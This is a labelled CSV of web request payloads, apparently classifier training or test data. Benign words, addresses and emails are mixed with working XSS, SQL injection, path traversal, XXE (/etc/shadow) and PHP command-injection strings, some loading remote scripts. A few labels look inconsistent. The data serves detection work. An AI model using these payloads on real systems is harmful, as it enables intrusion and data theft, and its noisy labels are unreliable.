index,payload,is_malicious,injection_type
2472,ordinates,0.0,LEGAL
2473,dreariness,0.0,LEGAL
2474,15280766A,0.0,LEGAL
2475,elections,0.0,LEGAL
2476,'><object/data=//goo.gl/nlX0P>,1.0,XSS
2477,"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",1.0,XSS
2478,Benson,0.0,LEGAL
2479,Aguilera+Troule,0.0,LEGAL
2480,C%2F+Alicante+101+1%3FA,0.0,LEGAL
2481,uucp,0.0,LEGAL
2482,sagradamente,0.0,LEGAL
2483,debating,0.0,LEGAL
2484,Pl.+Sastago+84%2C+,0.0,LEGAL
2485,243,0.0,LEGAL
2486,parapet,0.0,LEGAL
2487,loser,0.0,LEGAL
2488,3071574299603363,0.0,LEGAL
2489,contortions,0.0,LEGAL
2490,Heidegger,0.0,LEGAL
2491,theft,0.0,LEGAL
2492,radioed,0.0,LEGAL
2493,cHI5rleA8,0.0,LEGAL
2494,Pozuel+de+Ariza,0.0,LEGAL
2495,webdata,0.0,LEGAL
2496,35194800Q,0.0,LEGAL
2497,Ange,0.0,LEGAL
2498,whisk,0.0,LEGAL
2499,Honda,0.0,LEGAL
2500,8239878600110127,0.0,LEGAL
2501,Pablo+De+Rojas%2C+S%2FN%2C+,0.0,LEGAL
2502,\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1.0,SHELL
2503,trades,0.0,LEGAL
2504,impending,0.0,LEGAL
2505,sauce,0.0,LEGAL
2506,memorial,0.0,LEGAL
2507,decrypt,0.0,LEGAL
2508,A8Cye4uzrSknVrzmzKiW-2,0.0,LEGAL
2509,4896892002459011,0.0,LEGAL
2510,-530+or+1,0.0,LEGAL
2511,d75a4R45dEr,0.0,LEGAL
2512,lewwis.mall%40epbx.pg,0.0,LEGAL
2513,foro,0.0,LEGAL
2514,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>",1.0,XSS
2515,awe,0.0,LEGAL
2516,0577451455915929,0.0,LEGAL
2517,revising,0.0,LEGAL
2518,mswim;pos,0.0,LEGAL
2519,C%2F+Borja+137+8%3FC,0.0,LEGAL
2520,bonfire,0.0,LEGAL
2521,Tzeltal,0.0,LEGAL
2522,ms-utf-8,0.0,LEGAL
2523,expectedly,0.0,LEGAL
2524,specifiable,0.0,LEGAL
2525,"""/><textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>",1.0,XSS
2526,Cuesta+Pizarro+12%2C+4%3FD,0.0,LEGAL
2527,38989049R,0.0,LEGAL
2528,profitted,0.0,LEGAL
2529,hayden.jarret%40comodepilarse.am,0.0,LEGAL
2530,Dee dee,0.0,LEGAL
2531,alunarse,0.0,LEGAL
2532,crystallizing,0.0,LEGAL
2533,shuddering,0.0,LEGAL
2534,847,0.0,LEGAL
2535,Luan,0.0,LEGAL
2536,http%3A%2F%2Fview.atdmt.com%2FCNT%2Fview%2F176118284%2Fdirect%3Bwi.1%3Bhi.1%2F01%2F%3F1258328758,0.0,LEGAL
2537,opener,0.0,LEGAL
2538,joyce,0.0,LEGAL
2539,Navares+de+Ayuso,0.0,LEGAL
2540,CAtalO31ci%F31,0.0,LEGAL
2541,administrat,0.0,LEGAL
2542,motto,0.0,LEGAL
2543,veils,0.0,LEGAL
2544,1915san0066.tif,0.0,LEGAL
2545,Yarmouth,0.0,LEGAL
2546,sellgren,0.0,LEGAL
2547,03820,0.0,LEGAL
2548,jailed,0.0,LEGAL
2549,"<?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>",1.0,XSS
2550,Shorewood,0.0,LEGAL
2551,heuristics,0.0,LEGAL
2552,07195,0.0,LEGAL
2553,"-1<IMG SRC=""  javascript:document.cookie=true;"">",1.0,XSS
2554,adherence,0.0,LEGAL
2555,mohammadi%40rocofer.wf,0.0,LEGAL
2556,Kampuchea,0.0,LEGAL
2557,'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,1.0,XSS
2558,pounds,0.0,LEGAL
2559,certifications,0.0,LEGAL
2560,autodialer,0.0,LEGAL
2561,4UeDamIeNTO,0.0,LEGAL
2562,70138802A,0.0,LEGAL
2563,straightest,0.0,LEGAL
2564,vell,0.0,LEGAL
2565,roadster,0.0,LEGAL
2566,2491,0.0,LEGAL
2567,61128609Z,0.0,LEGAL
2568,top['al\\145rt'](1),1.0,XSS
2569,preparative,0.0,LEGAL
2570,cocking,0.0,LEGAL
2571,academics,0.0,LEGAL
2572,Banquilla%2C+171%2C+,0.0,LEGAL
2573,Pibrall+Ezponda,0.0,LEGAL
2574,ChinFui,0.0,LEGAL
2575,0265735813916459,0.0,LEGAL
2576,lemuel3,0.0,LEGAL
2577,sigh,0.0,LEGAL
2578,satellites,0.0,LEGAL
2579,boil,0.0,LEGAL
2580,9591817984905955,0.0,LEGAL
2581,cruising,0.0,LEGAL
2582,antisymmetric,0.0,LEGAL
2583,draft,0.0,LEGAL
2584,Mister,0.0,LEGAL
2585,denser,0.0,LEGAL
2586,exaggerations,0.0,LEGAL
2587,Evangelina+Sobredo+Galanes%2C+S%2FN+12-C,0.0,LEGAL
2588,Villanueva+de+Duero,0.0,LEGAL
2589,"'><A HREF=""http://google:127.0.0.1:3555/xss_serve_payloads/X.html"">X</A>",1.0,XSS
2590,rawness,0.0,LEGAL
2591,"<div style=""list-style:url(http://foo.f)\\20url(javascript:alert(1));"">X</div>",1.0,XSS
2592,37170,0.0,LEGAL
2593,1245111103,0.0,LEGAL
2594,join,0.0,LEGAL
2595,rerun,0.0,LEGAL
2596,Lavena,0.0,LEGAL
2597,doralynn,0.0,LEGAL
2598,childlike,0.0,LEGAL
2599,rm\x0bq51627428,0.0,LEGAL
2600,pretending,0.0,LEGAL
2601,remote,0.0,LEGAL
2602,Fe4r0g6ent8,0.0,LEGAL
2603,perished,0.0,LEGAL
2604,dream,0.0,LEGAL
2605,Pinsky,0.0,LEGAL
2606,redistributed,0.0,LEGAL
2607,Calle+Cap+Del+Pinar%2C+55%2C+,0.0,LEGAL
2608,Puritanizer,0.0,LEGAL
2609,Alpandeire,0.0,LEGAL
2610,powdery,0.0,LEGAL
2611,hawked,0.0,LEGAL
2612,A8Cyf4uzrS4uPpNmzK-blU,0.0,LEGAL
2613,shallower,0.0,LEGAL
2614,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1.0,SQL
2615,fueled,0.0,LEGAL
2616,5595,0.0,LEGAL
2617,Winsett,0.0,LEGAL
2618,16240,0.0,LEGAL
2619,50430,0.0,LEGAL
2620,Manzaneque,0.0,LEGAL
2621,cm.,0.0,LEGAL
2622,bully,0.0,LEGAL
2623,Casado+Vallcorba,0.0,LEGAL
2624,1257506919,0.0,LEGAL
2625,freedoms,0.0,LEGAL
2626,50108,0.0,LEGAL
2627,re53nc19g93s8,0.0,LEGAL
2628,serratosa%40yiutuve.pe,0.0,LEGAL
2629,Marcos+Redondo+151%2C+10%3FB,0.0,LEGAL
2630,-52+or+1,0.0,LEGAL
2631,5537760506536596,0.0,LEGAL
2632,83357480Y,0.0,LEGAL
2633,assumed,0.0,LEGAL
2634,&Search=abc123<%2Ftitle><script>alert('1')<%2Fscript>&Option=All&Find=Find,1.0,XSS
2635,intellectuals,0.0,LEGAL
2636,centralizes,0.0,LEGAL
2637,chalices,0.0,LEGAL
2638,gush,0.0,LEGAL
2639,nifty,0.0,LEGAL
2640,5762011011583829,0.0,LEGAL
2641,Breceda+Perdig%F3,0.0,LEGAL
2642,CEnSiDa,0.0,LEGAL
2643,boomerangs,0.0,LEGAL
2644,reel,0.0,LEGAL
2645,adjoining,0.0,LEGAL
2646,Rufino,0.0,LEGAL
2647,2899893992206591,0.0,LEGAL
2648,picosecond,0.0,LEGAL
2649,eating,0.0,LEGAL
2650,Cezanne,0.0,LEGAL
2651,kaete,0.0,LEGAL
2652,%foo;,1.0,XSS
2653,http%3A%2F%2Fmashable.com%2F2009%2F11%2F11%2Ftwitter-retweets-explained%2F,0.0,LEGAL
2654,modorra,0.0,LEGAL
2655,r*imbombo,0.0,LEGAL
2656,3376121794389360,0.0,LEGAL
2657,8n6s17D741a49e,0.0,LEGAL
2658,drifted,0.0,LEGAL
2659,infringement,0.0,LEGAL
2660,Ca%F1ada,0.0,LEGAL
2661,montesano_wontner%40pcvirus.tm,0.0,LEGAL
2662,multiprocessing,0.0,LEGAL
2663,crack,0.0,LEGAL
2664,executional,0.0,LEGAL
2665,fringed,0.0,LEGAL
2666,C%2F+Javea+57+,0.0,LEGAL
2667,unequaled,0.0,LEGAL
2668,subschemas,0.0,LEGAL
2669,mann,0.0,LEGAL
2670,Mayolas,0.0,LEGAL
2671,Nissie,0.0,LEGAL
2672,gopher,0.0,LEGAL
2673,Aranceta+Alameda,0.0,LEGAL
2674,lebRILLo,0.0,LEGAL
2675,reposed,0.0,LEGAL
2676,slum,0.0,LEGAL
2677,flabbergast,0.0,LEGAL
2678,[<script>]=*confirm(1)</script>,1.0,XSS
2679,xss=<link rel=import href=http://xss.cx/xss.js >,1.0,XSS
2680,04382300499523742008,0.0,LEGAL
2681,bookworm,0.0,LEGAL
2682,righteousness,0.0,LEGAL
2683,aristocratic,0.0,LEGAL
2684,saxe.valeri%40iurispretor.nl,0.0,LEGAL
2685,manifold,0.0,LEGAL
2686,worrier,0.0,LEGAL
2687,prado,0.0,LEGAL
2688,clocked,0.0,LEGAL
2689,d.cruz,0.0,LEGAL
2690,crumples,0.0,LEGAL
2691,http$3a$2f$2fwww$2easkmen$2ecom$2ftop_10$2fentertainment$2ftop-10-doomsday-prophecies$2ehtml,0.0,LEGAL
2692,sequero,0.0,LEGAL
2693,deedee,0.0,LEGAL
2694,impositions,0.0,LEGAL
2695,slipping,0.0,LEGAL
2696,unmanned,0.0,LEGAL
2697,strat,0.0,LEGAL
2698,23520,0.0,LEGAL
2699,Laine,0.0,LEGAL
2700,Manya,0.0,LEGAL
2701,hooker,0.0,LEGAL
2702,bartering,0.0,LEGAL
2703,nova-dussollier0%40programagestionerp.kp,0.0,LEGAL
2704,passivity,0.0,LEGAL
2705,inexistent_file_name.php,0.0,LEGAL
2706,ext_cht,0.0,LEGAL
2707,Santa+Cruz+de+la+Salceda,0.0,LEGAL
2708,<script>confirm(9)</script>,1.0,XSS
2709,filings,0.0,LEGAL
2710,dikes,0.0,LEGAL
2711,capita,0.0,LEGAL
2712,Mao,0.0,LEGAL
2713,Ruiloba,0.0,LEGAL
2714,22147,0.0,LEGAL
2715,29143904Y,0.0,LEGAL
2716,Mancor+de+la+Vall,0.0,LEGAL
2717,Isidoro,0.0,LEGAL
2718,briefest,0.0,LEGAL
2719,"<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(""XSS"")>",1.0,XSS
2720,anticipations,0.0,LEGAL
2721,assuring,0.0,LEGAL
2722,))%20waitfor%20delay%20'0:0:20'%20--,1.0,SQL
2723,key,0.0,LEGAL
2724,Berceruelo,0.0,LEGAL
2725,43820167S,0.0,LEGAL
2726,artisan,0.0,LEGAL
2727,"<img src=""javascript:alert('XSS');"">",1.0,XSS
2728,tit0bear,0.0,LEGAL
2729,panificable,0.0,LEGAL
2730,fairy,0.0,LEGAL
2731,batters,0.0,LEGAL
2732,impel,0.0,LEGAL
2733,eruption,0.0,LEGAL
2734,6194,0.0,LEGAL
2735,perishers,0.0,LEGAL
2736,prefixes,0.0,LEGAL
2737,hare,0.0,LEGAL
2738,77217103,0.0,LEGAL
2739,extraneousness,0.0,LEGAL
2740,Iru,0.0,LEGAL
2741,lewdly,0.0,LEGAL
2742,Ferreries,0.0,LEGAL
2743,groenning-kirwin%40corjet.kr,0.0,LEGAL
2744,Montmany,0.0,LEGAL
2745,Agna,0.0,LEGAL
2746,<!-- --!><script>alert(X)</script>-->,1.0,XSS
2747,http%3A%2F%2Fdance70cou,0.0,LEGAL
2748,4811965033503576,0.0,LEGAL
2749,plank,0.0,LEGAL
2750,Samuelson,0.0,LEGAL
2751,TENEX,0.0,LEGAL
2752,outstanding,0.0,LEGAL
2753,trade,0.0,LEGAL
2754,cure,0.0,LEGAL
2755,denver,0.0,LEGAL
2756,curiousest,0.0,LEGAL
2757,1257507454457,0.0,LEGAL
2758,bracketed,0.0,LEGAL
2759,ananda,0.0,LEGAL
2760,32893899N,0.0,LEGAL
2761,Jesuit,0.0,LEGAL
2762,effectors,0.0,LEGAL
2763,jehovah,0.0,LEGAL
2764,indignity,0.0,LEGAL
2765,whacked,0.0,LEGAL
2766,Ling-Yue,0.0,LEGAL
2767,curried,0.0,LEGAL
2768,astonishes,0.0,LEGAL
2769,10895,0.0,LEGAL
2770,"<A/HREF=""javascript:confirm(1)"">",1.0,XSS
2771,dissatisfactory,0.0,LEGAL
2772,59m9sti085z,0.0,LEGAL
2773,dorion,0.0,LEGAL
2774,alla,0.0,LEGAL
2775,swerving,0.0,LEGAL
2776,&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;,1.0,XSS
2777,7636016430512183,0.0,LEGAL
2778,keypads,0.0,LEGAL
2779,avalanches,0.0,LEGAL
2780,occlusions,0.0,LEGAL
2781,o.neil,0.0,LEGAL
2782,1331749509,0.0,LEGAL
2783,chorused,0.0,LEGAL
2784,adjuncts,0.0,LEGAL
2785,kundel,0.0,LEGAL
2786,decolletage,0.0,LEGAL
2787,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",1.0,SQL
2788,shrilling,0.0,LEGAL
2789,http%3A%2F%2Fsafewording.blogspot.com%2F,0.0,LEGAL
2790,Halette,0.0,LEGAL
2791,cheshire.albertazzi%40be%F1esmer.tn,0.0,LEGAL
2792,Egyptians,0.0,LEGAL
2793,San+Gil+174%2C+6%3FF,0.0,LEGAL
2794,&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,1.0,XSS
2795,solicited,0.0,LEGAL
2796,millimeter,0.0,LEGAL
2797,Maita,0.0,LEGAL
2798,ChInchintoR,0.0,LEGAL
2799,62140654J,0.0,LEGAL
2800,21888292C,0.0,LEGAL
2801,soohoo,0.0,LEGAL
2802,33245427P,0.0,LEGAL
2803,desegregate,0.0,LEGAL
2804,reassessment,0.0,LEGAL
2805,atrophy,0.0,LEGAL
2806,abodes,0.0,LEGAL
2807,E9Q4573AR,0.0,LEGAL
2808,02849477611027746579,0.0,LEGAL
2809,Jacobsen,0.0,LEGAL
2810,8198,0.0,LEGAL
2811,<script src=//brutelogic.com.br/1.js>,1.0,XSS
2812,Polaris,0.0,LEGAL
2813,Ngan,0.0,LEGAL
2814,Sang-Maun,0.0,LEGAL
2815,NaB%CD,0.0,LEGAL
2816,t443,0.0,LEGAL
2817,</SCRIPT>”>”><SCRIPT>prompt(1)</SCRIPT>,1.0,XSS
2818,asunder,0.0,LEGAL
2819,honda,0.0,LEGAL
2820,lincear,0.0,LEGAL
2821,danny,0.0,LEGAL
2822,Eiffel,0.0,LEGAL
2823,Its-Eng,0.0,LEGAL
2824,panoramic,0.0,LEGAL
2825,sq-utf-8,0.0,LEGAL
2826,6959831886953131,0.0,LEGAL
2827,kass,0.0,LEGAL
2828,Alan,0.0,LEGAL
2829,Perpiny%E0+Romero,0.0,LEGAL
2830,Caucasus,0.0,LEGAL
2831,healed,0.0,LEGAL
2832,seashores,0.0,LEGAL
2833,crumbly,0.0,LEGAL
2834,5952804750177052,0.0,LEGAL
2835,deLi6EsCENCI1,0.0,LEGAL
2836,55902127Y,0.0,LEGAL
2837,ajorca,0.0,LEGAL
2838,eyewitness,0.0,LEGAL
2839,"<script>     function b() { return Safe.get(); } confirm(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",1.0,XSS
2840,sank,0.0,LEGAL
2841,ptbr-utf-8,0.0,LEGAL
2842,appreciation,0.0,LEGAL
2843,Wes,0.0,LEGAL
2844,88,0.0,LEGAL
2845,antigens,0.0,LEGAL
2846,intercommunicating,0.0,LEGAL
2847,Escherichia,0.0,LEGAL
2848,lagrange,0.0,LEGAL
2849,lumbly%40peliculasen3d.cn,0.0,LEGAL
2850,Aurelius,0.0,LEGAL
2851,scurvy,0.0,LEGAL
2852,Blay+Colmenares,0.0,LEGAL
2853,Pintado+Fontbern,0.0,LEGAL
2854,1331915601,0.0,LEGAL
2855,redly,0.0,LEGAL
2856,Shelby,0.0,LEGAL
2857,Susan,0.0,LEGAL
2858,ailment,0.0,LEGAL
2859,ye-sho,0.0,LEGAL
2860,"&collection=81""><script>alert(String.fromCharCode(88,83,83))</script>",1.0,XSS
2861,shrank,0.0,LEGAL
2862,filthiness,0.0,LEGAL
2863,Saratoga,0.0,LEGAL
2864,C%2F+Artazuri%F1a%2C+43+10%3FE,0.0,LEGAL
2865,Pearla,0.0,LEGAL
2866,incompressible,0.0,LEGAL
2867,nightmarish,0.0,LEGAL
2868,5pqfb5ysoytiz4yve,0.0,LEGAL
2869,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Fshoujo_kakumei_utena%2Fc009%2F9.html,0.0,LEGAL
2870,1331732701,0.0,LEGAL
2871,taxicab,0.0,LEGAL
2872,ensuing,0.0,LEGAL
2873,53217744E,0.0,LEGAL
2874,la_verne,0.0,LEGAL
2875,<svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:(),1.0,XSS
2876,inFarto,0.0,LEGAL
2877,rooftop,0.0,LEGAL
2878,governmentally,0.0,LEGAL
2879,http%3A%2F%2Fmysims3blog.blogspot.com%2F,0.0,LEGAL
2880,twirled,0.0,LEGAL
2881,poverty,0.0,LEGAL
2882,1' or '1'='1,1.0,SQL
2883,"<audio src=""data:audio/mp3,%FF%F3%84%C4%FF%F3%14% C4"" oncanplay=""alert(1)"">",1.0,XSS
2884,reactivating,0.0,LEGAL
2885,rohe2,0.0,LEGAL
2886,Almaluez,0.0,LEGAL
2887,papp%40sexplorador.il,0.0,LEGAL
2888,Molinos,0.0,LEGAL
2889,computation,0.0,LEGAL
2890,Ribera+del+Fresno,0.0,LEGAL
2891,aviary,0.0,LEGAL
2892,<i/style=x=x/**/(confirm(1))('\')expression\')>,1.0,XSS
2893,thorne-smith%40sandrasummer.fm,0.0,LEGAL
2894,Barbee,0.0,LEGAL
2895,Galofr%E9+Antelo,0.0,LEGAL
2896,splashing,0.0,LEGAL
2897,Kue,0.0,LEGAL
2898,nakedly,0.0,LEGAL
2899,cass,0.0,LEGAL
2900,Caleruega,0.0,LEGAL
2901,11948884Q,0.0,LEGAL
2902,1257801641468,0.0,LEGAL
2903,http%3A%2F%2Fwww.mangafox.com%2Fmanga%2Fgokujou_danshi_to_kurashi_temasu%2Fv01%2Fc003%2F5.html,0.0,LEGAL
2904,3842504207322211,0.0,LEGAL
2905,&from=pooptato&to=<font%20color=00ff00><marquee%20BEHAVIOR=ALTERNATE%20BGColor=black><plaintext>,1.0,XSS
2906,Orieta,0.0,LEGAL
2907,chaplain,0.0,LEGAL
2908,whooping,0.0,LEGAL
2909,accusation,0.0,LEGAL
2910,64633352V,0.0,LEGAL
2911,saqUE430,0.0,LEGAL
2912,blanketing,0.0,LEGAL
2913,0769508418370653,0.0,LEGAL
2914,peptide,0.0,LEGAL
2915,disturber,0.0,LEGAL
2916,Tosos,0.0,LEGAL
2917,Finees,0.0,LEGAL
2918,Cornelian,0.0,LEGAL
2919,6646364867316406,0.0,LEGAL
2920,06185,0.0,LEGAL
2921,tear,0.0,LEGAL
2922,slingshot,0.0,LEGAL
2923,"<EMBED SRC=""http://127.0.0.1:3555/xss_serve_payloads/flash.swf""></EMBED>",1.0,XSS
2924,Carmen,0.0,LEGAL
2925,bakr%40streaptease.zw,0.0,LEGAL
2926,allocatable,0.0,LEGAL
2927,Bayreuth,0.0,LEGAL
2928,conflicting,0.0,LEGAL
2929,';location='javascript://'%2Blocation.hash;',1.0,XSS
2930,1254332515831375,0.0,LEGAL
2931,Macuare+Ribes,0.0,LEGAL
2932,coop,0.0,LEGAL
2933,Castilforte,0.0,LEGAL
2934,Mart%EDn+de+Yeltes,0.0,LEGAL
2935,68266885X,0.0,LEGAL
2936,mediums,0.0,LEGAL
2937,hillbilly,0.0,LEGAL
2938,v%C1Rdulo,0.0,LEGAL
2939,"<img src=""x` `<script>javascript:alert(1)</script>""` `>",1.0,XSS
2940,uniting,0.0,LEGAL
2941,freezing,0.0,LEGAL
2942,778293721,0.0,LEGAL
2943,redness,0.0,LEGAL
2944,Moline,0.0,LEGAL
2945,Edwardine,0.0,LEGAL
2946,3302117123489448,0.0,LEGAL
2947,using,0.0,LEGAL
2948,shiva,0.0,LEGAL
2949,subways,0.0,LEGAL
2950,loti%40ajuntamentbarcelona2-0.is,0.0,LEGAL
2951,8a92rique46,0.0,LEGAL
2952,krassina%40designworld.sl,0.0,LEGAL
2953,Romildo,0.0,LEGAL
2954,Lora,0.0,LEGAL
2955,overrun,0.0,LEGAL
2956,<script type=text/vbscript>msgbox document.location</script> // IE 10,1.0,XSS
2957,C%2F+Arquitecto+Hernandez+Rubio%2C+101%2C+1H,0.0,LEGAL
2958,phpe9568f35-d428-11d2-a769-00aa001acf42,0.0,LEGAL
2959,Pl.+Comercial+54%2C+5D,0.0,LEGAL
2960,amused,0.0,LEGAL
2961,Lamm+Lodeiro,0.0,LEGAL
2962,41t1lecti22,0.0,LEGAL
2963,ambles,0.0,LEGAL
2964,&#x000003c;,1.0,XSS
2965,Barbara-anne,0.0,LEGAL
2966,butler,0.0,LEGAL
2967,3783,0.0,LEGAL
2968,disapproves,0.0,LEGAL
2969,coed,0.0,LEGAL
2970,fount,0.0,LEGAL
2971,1257220358?,0.0,LEGAL
2972,dane,0.0,LEGAL
2973,64575959D,0.0,LEGAL
2974,chuckle,0.0,LEGAL
2975,alterers,0.0,LEGAL
2976,faulting,0.0,LEGAL
2977,Ablitas+Vilaregut,0.0,LEGAL
2978,Pelliser+Lago,0.0,LEGAL
2979,parola%40zonamodelos.pl,0.0,LEGAL
2980,Callejon+De+La+Hera%2C+86+,0.0,LEGAL
2981,${@print(system($_SERVER['HTTP_USER_AGENT']))},1.0,XSS
2982,<object onfocus=popup=1;>,1.0,XSS
2983,15285318586630384844,0.0,LEGAL
2984,Johnathan,0.0,LEGAL
2985,Baena,0.0,LEGAL
2986,inclosed,0.0,LEGAL
2987,hUmAn%21aMeNtE,0.0,LEGAL
2988,pail,0.0,LEGAL
2989,Cenozoic,0.0,LEGAL
2990,82533739X,0.0,LEGAL
2991,964,0.0,LEGAL
2992,1417058037,0.0,LEGAL
2993,'^0# ,1.0,SQL
2994,was,0.0,LEGAL
2995,dbms,0.0,LEGAL
2996,d-icot%F3mico,0.0,LEGAL
2997,21208,0.0,LEGAL
2998,fragmented,0.0,LEGAL
2999,1252094406028140,0.0,LEGAL
3000,'><b <script>alert(1)//</script>0</script></b>,1.0,XSS
3001,trillionth,0.0,LEGAL
3002,Paleteo,0.0,LEGAL
3003,<script src=//3334957647/1>,1.0,XSS
3004,named,0.0,LEGAL
3005,Florencio+Castillo%2C+111+,0.0,LEGAL
3006,abr70onar,0.0,LEGAL
3007,insult,0.0,LEGAL
3008,62120654T,0.0,LEGAL
3009,Naudi,0.0,LEGAL
3010,celinska.duang%40ringringrent.uk,0.0,LEGAL
3011,declare @q nvarchar (4000) select @q =0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1.0,SQL
3012,versatile,0.0,LEGAL
3013,recapitulates,0.0,LEGAL
3014,sequenced,0.0,LEGAL
3015,10739,0.0,LEGAL
3016,porters,0.0,LEGAL
3017,classifiers,0.0,LEGAL
3018,Mar%EDa+Celeste,0.0,LEGAL
3019,8651552740405089,0.0,LEGAL
3020,sandford%40directoriogratuito.yu,0.0,LEGAL
3021,Barot+Holm,0.0,LEGAL
3022,Garciaz,0.0,LEGAL
3023,1005,0.0,LEGAL
3024,dafauca%40ajuntamentdebcn2-0.cz,0.0,LEGAL
3025,80914738W,0.0,LEGAL
3026,legions,0.0,LEGAL
3027,Dorita,0.0,LEGAL
3028,"""`\'><script>\\x0Bjavascript:alert(1)</script>",1.0,XSS
3029,74725623A,0.0,LEGAL
3030,saunter,0.0,LEGAL
3031,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1.0,SQL
3032,buffering,0.0,LEGAL
3033,http%3A%2F%2Fad.yieldmanager.com%2Fiframe3%3FAAAAAFEzCwB9iDIAAAAAANMEDgAAAAAAAgAEAAYAAAAAAP8AAAAFBO6eEwAAAAAAmHwAAAAAAACY0xMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACfwAUAAAAAAAIAAwAAAAAAAQAsvoF72D9lZmbKUv.uPwEAeh7sZuQ......cTU-T8AAAAAAAAAAP...0nv6gdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACmr4SHEG47B0pjaCQTEQ0T4cG3xmvBO7yVn4NXAAAAAA%3D%3D%2C%2Chttp%3A%2F%2Fwww.coloreardibujosinfantiles.com%2Fanimales-marinos.html,0.0,LEGAL
3034,rpc,0.0,LEGAL
3035,hendrix,0.0,LEGAL
3036,besides,0.0,LEGAL
3037,Casadei+Atuesta,0.0,LEGAL
3038,42191,0.0,LEGAL
3039,Huete,0.0,LEGAL
3040,Co-Op,0.0,LEGAL
3041,untouchable,0.0,LEGAL
3042,Jilleen,0.0,LEGAL
3043,"<svg><![CDATA[><imagexlink:href=""]]><img/src=xx:xonerror=alert(2)//""></svg> // By Secalert",1.0,XSS
3044,exposer,0.0,LEGAL
3045,Harinder,0.0,LEGAL
3046,malaria,0.0,LEGAL
3047,disim%E9trica,0.0,LEGAL
3048,Kessler,0.0,LEGAL
3049,Fernandina,0.0,LEGAL
3050,crotchety,0.0,LEGAL
3051,"alert(String.fromCharCode(75,67,70))//"";alert(String.fromCharCode(75,67,70))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>",1.0,XSS
3052,briefed,0.0,LEGAL
3053,imaginations,0.0,LEGAL
3054,49760,0.0,LEGAL
3055,Amalita,0.0,LEGAL
3056,1138illo,0.0,LEGAL
3057,Normanize,0.0,LEGAL
3058,25442,0.0,LEGAL
3059,petrone%40miplat.int,0.0,LEGAL
3060,Com%EDn+Galindez,0.0,LEGAL
3061,win%40yes123.bn,0.0,LEGAL
3062,%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,1.0,XSS
3063,Brittany,0.0,LEGAL
3064,46183,0.0,LEGAL
3065,acclaimed,0.0,LEGAL
3066,httP://aa'><script>alert(123)</script>,1.0,XSS
3067,"exp/*<A STYLE='no\X:noX(""*//*"");X:ex/*X*//*/*/pression(alert(""X""))'>",1.0,XSS
3068,Story,0.0,LEGAL
3069,5246598463194503,0.0,LEGAL
3070,"<![C b=""c"">",1.0,XSS
3071,Spaniard,0.0,LEGAL
